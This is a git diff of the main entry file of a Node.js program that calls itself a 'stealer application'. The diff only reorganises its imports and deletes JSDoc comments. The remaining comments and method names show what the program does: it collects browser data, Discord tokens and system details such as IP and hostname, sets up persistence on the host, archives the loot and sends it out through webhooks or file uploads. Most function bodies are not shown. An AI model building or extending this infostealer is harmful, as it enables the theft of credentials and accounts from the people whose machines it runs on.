@@ -3,28 +3,17 @@
  * Clean, modular, and efficient stealer application
  */
 
-// Core imports
-const { logger, ErrorHandler, fileManager, stats, CoreUtils } = require('./core');
+const { logger } = require('./core/logger');
+const { ErrorHandler } = require('./core/errors');
 const config = require('./config/config');
+const { fileManager } = require('./core/fileManager');
+const { stats } = require('./core/statistics');
+const { BrowserCollector } = require('./modules/browsers/collector');
+const { DiscordService } = require('./services/discord/service');
+const { uploadService } = require('./services/upload/service');
+const CoreUtils = require('./core/utils');
 
-// Module imports
-const { BrowserCollector } = require('./modules');
-
-// Service imports
-const { DiscordService, uploadService } = require('./services');
-
-/**
- * Main Application Class
- * Orchestrates the entire data collection and sending workflow
- * 
- * @class Application
- * @description Handles initialization, data collection, processing, and cleanup
- */
 class Application {
-    /**
-     * Create an Application instance
-     * @constructor
-     */
     constructor() {
         this.initialized = false;
         this.results = {};
@@ -39,11 +28,6 @@ class Application {
 
     /**
      * Initialize application
-     * @async
-     * @function initialize
-     * @description Sets up the application environment and validates configuration
-     * @throws {Error} When configuration is invalid or initialization fails
-     * @returns {Promise<void>}
      */
     async initialize() {
         try {
@@ -73,10 +57,6 @@ class Application {
 
     /**
      * Collect system information
-     * @async
-     * @function collectSystemInfo
-     * @description Gathers system metadata including IP, hostname, and platform info
-     * @returns {Promise<void>}
      */
     async collectSystemInfo() {
         try {
@@ -98,10 +78,6 @@ class Application {
 
     /**
      * Setup persistence mechanism
-     * @async
-     * @function setupPersistence
-     * @description Configures application persistence if self-destruct is disabled
-     * @returns {Promise<void>}
      */
     async setupPersistence() {
         try {
@@ -124,10 +100,6 @@ class Application {
 
     /**
      * Run data collection modules
-     * @async
-     * @function collectData
-     * @description Orchestrates data collection from all enabled modules
-     * @returns {Promise<Object|null>} Collected data object or null if no Discord tokens found
      */
     async collectData() {
         if (!this.initialized) {
@@ -192,11 +164,6 @@ class Application {
 
     /**
      * Process and send collected data
-     * @async
-     * @function processAndSend
-     * @description Creates archives and sends data via webhooks or file uploads
-     * @throws {Error} When processing or sending fails
-     * @returns {Promise<void>}
      */
     async processAndSend() {
         try {
@@ -241,12 +208,6 @@ class Application {
 
     /**
      * Send main webhook with statistics
-     * @async
-     * @function sendMainWebhook
-     * @description Sends main webhook with system stats and optional file attachment
-     * @param {string} [downloadLink=''] - Optional download link for external file uploads
-     * @param {string} [zipPath=''] - Optional path to zip file for direct attachment
-     * @returns {Promise<void>}
      */
     async sendMainWebhook(downloadLink = '', zipPath = '') {
         try {
@@ -275,10 +236,6 @@ class Application {
 
     /**
      * Cleanup resources
-     * @async
-     * @function cleanup
-     * @description Cleans up temporary files and resources
-     * @returns {Promise<void>}
      */
     async cleanup() {
         try {
@@ -295,10 +252,6 @@ class Application {
 
     /**
      * Run complete application workflow
-     * @async
-     * @function run
-     * @description Executes the complete application lifecycle from initialization to cleanup
-     * @returns {Promise<void>}
      */
     async run() {
         try {
@@ -341,10 +294,6 @@ class Application {
 
 /**
  * Application entry point
- * @async
- * @function main
- * @description Creates and runs the main application instance
- * @returns {Promise<void>}
  */
 async function main() {
     const app = new Application();
